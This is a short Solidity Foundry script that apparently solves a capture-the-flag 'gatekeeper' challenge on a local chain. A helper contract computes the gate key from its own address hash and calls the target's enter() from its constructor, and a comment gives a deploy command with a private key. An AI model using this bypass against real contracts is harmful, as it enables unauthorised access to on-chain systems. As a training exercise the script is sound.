// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function enter(bytes8) external returns (bool);
    function entrant() external view returns (address);
}

contract Helper {
    constructor(address target) public {
        bytes8 answer = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        ITarget(target).enter(answer);
    }
}
contract SolveScript is Script {
    address public target = 0x8dAF17A20c9DBA35f005b6324F493785D239719d;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("entrant address : %s", ITarget(target).entrant());
        Helper helper = new Helper(target);
        console.log("entrant address after poc : %s", ITarget(target).entrant());
        vm.stopBroadcast();
    }
}
